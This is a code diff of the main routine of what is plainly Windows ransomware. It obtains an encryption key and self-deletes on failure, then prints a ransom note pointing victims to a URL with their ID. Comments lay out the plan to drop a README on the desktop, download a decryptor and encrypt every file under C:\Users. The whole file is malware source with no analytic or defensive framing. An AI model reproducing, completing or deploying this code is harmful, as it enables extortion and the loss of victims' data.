@@ -1,7 +1,13 @@
 #include <stdio.h>
-#include "utils.h"
+#include "keygen.h"
 #include "delete.h"
 #include "config.h"
+#include "utils.h"
+#include "encrypt.h"
+
+#ifdef _WIN32
+#include <windows.h>
+#endif
 
 int main(int argc, char *argv[]) {
     /*
@@ -9,24 +15,24 @@ int main(int argc, char *argv[]) {
         self_delete(argv[0]);
     #endif
     */
-    char key[65];
+    char key[512];
     int id;
-    get_key(&id, key); // error setting the id
-    printf("ID: %d\n", id);
-    printf("Key: %s\n", key);
-    if (key && !key[0]) {
+    if (get_key(&id, key) == 0) {
         self_delete(argv[0]);
     }
-    /*TODO:
-        write a README on user desktop with server url and id
-        foreach files != (README.txt || paths.txt) from 'C:\Users' call encrypt(filepath, key)
-            success   -> add filepath to paths.txt 
-            exception ->  pass
-        delete key from memory
+    char readme[1024];
+    snprintf(readme, sizeof(readme), "All you're files were encrypted, go to %s\nYou're ID is: %d\n", URL, id);
+    printf(readme, sizeof(readme));
+    /*
+    write readme on C:\Users\%s\Desktop\README.txt
+    // Download the file from ('$s/Decrypt.exe',URL) to Desktop
+    foreach file in 'C:\Users':
+        if (encrypt(filepath, key) == 1):
+            append filepath on "C:\Users\Public\Documents\.paths.txt"
+        else:
+            pass
     */
-    char readme[256];
-    snprintf(readme, sizeof(readme), "All you're files were encrypted, go to http://%s:%d\nYou're ID is: %d", SERVER_IP, SERVER_PORT, id);
-    printf("Concatenated string: %s\n", readme);
-
+    
+    //self_delete(argv[0]);
     return 0;
 }
